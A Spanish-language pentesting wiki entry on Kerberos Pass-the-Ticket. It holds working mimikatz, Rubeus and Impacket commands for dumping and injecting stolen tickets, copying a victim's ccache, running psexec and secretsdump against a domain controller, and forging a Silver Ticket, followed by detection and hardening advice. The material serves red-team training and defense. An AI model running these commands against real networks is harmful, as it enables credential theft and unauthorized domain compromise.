---
title: Pass-the-Ticket
slug: pass-the-ticket
aliases: [Pass-the-Ticket, PtT, ticket reuse, mimikatz ptt, Rubeus ptt, ccache reuse, Kerberos ticket injection]
fase: [Post-Explotación]
plataforma: Windows
dificultad: Intermedia
mitre: [T1550.003]
related: [pass-the-hash, golden-ticket, silver-ticket, credential-dumping, ejecucion-remota-windows, enumeracion-kerberos]
learning_refs: []
---

# Pass-the-Ticket

## Descripción
Reutilización de un ticket Kerberos válido (TGT o TGS) robado de la memoria/disco de un host comprometido para autenticarse como otro usuario sin conocer su contraseña ni hash. A diferencia de Pass-the-Hash (que usa hashes NTLM y va por NTLM), Pass-the-Ticket usa la cadena Kerberos completa: el ticket se importa en la sesión actual y se presenta a servicios remotos. Es la técnica de movimiento lateral preferida en entornos donde NTLM está deshabilitado o monitoreado, y es la natural continuación de Golden/Silver Ticket (que también usan PtT como entrega final). Los tickets se extraen de LSASS en Windows (`sekurlsa::tickets`) o de archivos ccache en Linux (`/tmp/krb5cc_*`, escenario común tras dump de un servidor con autenticación Kerberos).

## Herramientas
- **mimikatz** (`sekurlsa::tickets /export`, `kerberos::ptt`) — exporta tickets de LSASS y los inyecta en sesiones
- **Rubeus** (`dump`, `ptt`, `monitor`) — equivalente moderno en .NET, mejor evasión que mimikatz
- **Impacket** + variable `KRB5CCNAME` — uso de tickets en formato ccache desde Linux
- **ticketConverter.py** (Impacket) — convierte entre `.kirbi` (Windows) y `.ccache` (Linux) para portabilidad cross-platform

## Comandos / Ejemplos

### Extraer tickets de LSASS con mimikatz (Windows, requiere SeDebugPrivilege)
```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# Genera archivos *.kirbi en el directorio actual: uno por cada ticket en memoria
# Formato: [LUID]-[USER]@[SERVICE]-[DOMAIN].kirbi

# Listar tickets en memoria sin exportar
mimikatz # kerberos::list /export
```

### Inyectar un ticket en la sesión actual (Pass-the-Ticket clásico)
```
# Inyectar TGT robado para asumir la identidad del usuario
mimikatz # kerberos::ptt [LUID]-Administrator@krbtgt-CORP.LOCAL.kirbi

# Verificar
mimikatz # misc::cmd
C:\> klist
C:\> dir \\dc01.corp.local\c$
```

### Pass-the-Ticket con Rubeus (alternativa moderna)
```powershell
# Dumpear tickets actuales
Rubeus.exe dump /nowrap

# Output: tickets en base64. Copiar el TGT del usuario objetivo

# Inyectar ticket
Rubeus.exe ptt /ticket:doIFEjCCBQ6gAwIB...  # base64 del ticket

# Monitorear adquisición de TGTs nuevos en tiempo real (sniffer pasivo)
Rubeus.exe monitor /interval:10 /nowrap
```

### Pass-the-Ticket en Linux (ccache)
```bash
# Si robaste un ccache de /tmp en un host comprometido (típico tras leer LSA con kerberos auth):
scp victim:/tmp/krb5cc_1001 ./robbed.ccache

# Cargar en variable de entorno
export KRB5CCNAME=$(pwd)/robbed.ccache
klist  # debería listar el ticket robado

# Usar el ticket con Impacket
impacket-psexec -k -no-pass corp.local/usuario@dc01.corp.local
impacket-secretsdump -k -no-pass corp.local/usuario@dc01.corp.local

# Usar el ticket con tools nativos Kerberos
ssh -K usuario@server.corp.local
smbclient //server/share -k
```

### Conversión cross-platform entre .kirbi y .ccache
```bash
# Robaste tickets en Windows (.kirbi) y quieres usarlos desde Linux
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache

# O al revés: ccache de Linux importable en Windows
impacket-ticketConverter robbed.ccache imported.kirbi
# Luego en Windows: mimikatz # kerberos::ptt imported.kirbi
```

### Caso compuesto: PtT + Silver Ticket
```
# Forjar Silver Ticket localmente y luego inyectar via PtT
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:dc01.corp.local /service:cifs /rc4:<HASH_DC01> /ticket:silver.kirbi
# (sin /ptt, guardamos el ticket)

# Tiempo después, en otra sesión
mimikatz # kerberos::ptt silver.kirbi
dir \\dc01.corp.local\c$
```

## Contramedidas
- Reducir ticket lifetime (default 10 horas TGT, 10 horas TGS): GPO "Maximum lifetime for user ticket" más corto en zonas críticas
- Habilitar el grupo Protected Users para usuarios privilegiados: bloquea NTLM, RC4 Kerberos, y delegación, además de reducir el cache de credenciales en LSASS
- Habilitar Credential Guard / VBS para aislar LSASS y prevenir extracción de tickets vía debug
- Detectar uso de tickets sin AS-REQ previo correlacionando Event ID 4624 (logon en host) sin Event ID 4768 (TGT issuance) ni 4769 (TGS issuance) correspondientes en el DC
- Microsoft Defender for Identity detecta "Suspected identity theft (pass-the-ticket)" basándose en la presencia del mismo TGT en múltiples hosts simultáneamente
- Restringir SeDebugPrivilege a cuentas estrictamente necesarias (debugging legítimo): sin este privilegio, mimikatz no puede leer LSASS
- Implementar tier 0 administration: las cuentas con tickets sensibles (Domain Admins) sólo se autentican en DCs y PAWs, nunca en estaciones de trabajo donde puedan extraerse
- Auditar y rotar tickets sospechosos: `klist purge` borra el cache local; en respuesta a incidentes, forzar logoff de usuarios afectados invalida sus tickets en memoria
- Monitorear creación de archivos `.kirbi` y patrones de acceso a `\\.\Default` namespace (canal mimikatz)

## Referencias
- MITRE Corporation. (2024). *ATT&CK Technique T1550.003: Use Alternate Authentication Material: Pass the Ticket*. https://attack.mitre.org/techniques/T1550/003/
- gentilkiwi. (s.f.). *mimikatz* [Software]. GitHub. https://github.com/gentilkiwi/mimikatz
- GhostPack. (s.f.). *Rubeus* [Software]. GitHub. https://github.com/GhostPack/Rubeus
- fortra. (s.f.). *Impacket* [Software]. GitHub. https://github.com/fortra/impacket
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
